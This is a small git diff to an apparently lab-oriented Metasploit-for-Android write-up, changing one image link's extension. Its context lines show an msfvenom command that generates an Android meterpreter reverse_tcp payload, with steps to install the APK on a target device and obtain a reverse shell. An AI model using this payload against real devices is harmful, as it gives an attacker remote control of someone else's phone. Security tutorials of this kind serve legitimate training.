@@ -29,7 +29,7 @@ $ ./msfvenom -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 
 
 Install the apk generated on the target device(genymotion/android)
 
-![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/3.jpeg)
+![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/3.jpg)
 ![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/4.png)
 
 Go to ‘opt/metasploit-framework/bin’ and follow the steps to get the reverse shell
